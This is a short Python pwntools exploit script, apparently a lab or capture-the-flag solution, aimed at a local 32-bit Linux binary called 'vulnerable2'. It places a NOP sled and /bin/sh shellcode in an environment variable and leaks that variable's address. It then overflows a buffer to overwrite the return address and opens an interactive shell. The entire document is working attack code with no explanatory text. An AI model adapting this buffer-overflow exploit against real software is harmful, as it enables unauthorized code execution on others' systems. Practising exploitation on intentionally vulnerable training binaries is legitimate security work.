#!/usr/bin/env python
from pwn import *

# 32 bit linux
context(arch='i386', os='linux')

# Generate vars
nopsled = "\x90" * 100
sc = asm(shellcraft.sh())
ret_offset = 20

# Generate process, with SHELLCODE env var
p = process('./vulnerable2', env={ 'SHELLCODE' : nopsled + sc })

# Leak env address
p.send('ABCD')
sc_addr = p.recv()[4:8]

log.info("addr is: 0x{:08x}".format(unpack(sc_addr, 'all', endian='little', sign=False)))

# Craft payload
payload = "A" * ret_offset
payload += sc_addr

# Send payload
p.send(payload)

p.interactive()